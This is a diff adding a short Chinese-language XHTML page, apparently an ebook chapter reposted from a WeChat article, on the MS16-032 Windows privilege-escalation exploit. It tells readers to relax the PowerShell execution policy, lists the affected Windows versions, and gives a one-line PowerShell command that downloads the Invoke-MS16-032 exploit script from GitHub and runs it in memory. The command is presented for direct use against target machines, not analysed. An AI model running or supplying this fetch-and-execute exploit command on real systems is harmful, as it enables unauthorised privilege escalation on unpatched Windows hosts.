@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>MS16-032通杀高版本Windows</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>MS16-032通杀高版本Windows</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651864819&amp;idx=1&amp;sn=6ec638e9cd0a16cddccea210d9d29c19&amp;chksm=8442c614b3354f02a861add7006cf35edad5d6bf62fb8c30a08907bcf48fd4a758288c106f46&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651864819&amp;idx=1&amp;sn=6ec638e9cd0a16cddccea210d9d29c19&amp;chksm=8442c614b3354f02a861add7006cf35edad5d6bf62fb8c30a08907bcf48fd4a758288c106f46&amp;scene=27#wechat_redirect</a></blockquote><p><img data-w="" data-ratio="0.7140287769784173" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IGia6VXThug0j9lbNb6xadKKMT1CVQ4z2hwcPMNF3Uo6KdPUuIakAb8nXWeG3Ze1QL01v2uVTUuOuw/0?wx_fmt=jpeg" src="../Images/9aeb28309e98fd0a6807cc6934238015.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IGia6VXThug0j9lbNb6xadKKMT1CVQ4z2hwcPMNF3Uo6KdPUuIakAb8nXWeG3Ze1QL01v2uVTUuOuw/0?wx_fmt=jpeg"/><br/>可能会遇到问题<span style="color: #ff0000;">无法加载文件 ******.ps1，因为在此系统中禁止执行脚本</span>。</p><p>执行</p><p><span style="color: #0000ff;">        set-executionpolicy remotesigned </span></p><p>选择Y即可。</p><pre>支持机器Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!
+测试于 x32 Win7, x64 Win8, x64 2k12R2</pre><p>Powershell一键命令,视情况而用</p><p>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1'); Invoke-MS16-032<br/></p>
+        
+</body>
+</html>
